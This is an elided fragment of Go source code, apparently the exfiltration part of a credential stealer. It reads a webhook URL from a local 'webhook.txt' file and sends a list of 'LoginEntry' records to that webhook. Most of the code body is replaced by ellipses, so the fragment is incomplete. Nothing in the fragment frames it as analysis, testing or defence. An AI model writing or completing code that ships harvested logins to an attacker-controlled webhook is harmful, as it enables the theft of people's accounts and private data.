...
func readWebhookURL() (string, error) {
	...
	file, err := os.Open(filepath.Join(dir, "webhook.txt"))
	if err != nil {
		return "", fmt.Errorf("webhook.txt not found")
	}
	defer file.Close()
	...
	return "", fmt.Errorf("webhook.txt is empty")
}

func sendToWebhook(entries []LoginEntry, url string) error {
...
func main() {
	...
	if err != nil {
		fmt.Println("[!] Failed to read webhook URL:", err)
		return
	}
	...
	err = sendToWebhook(entries, webhookURL)
	if err != nil {
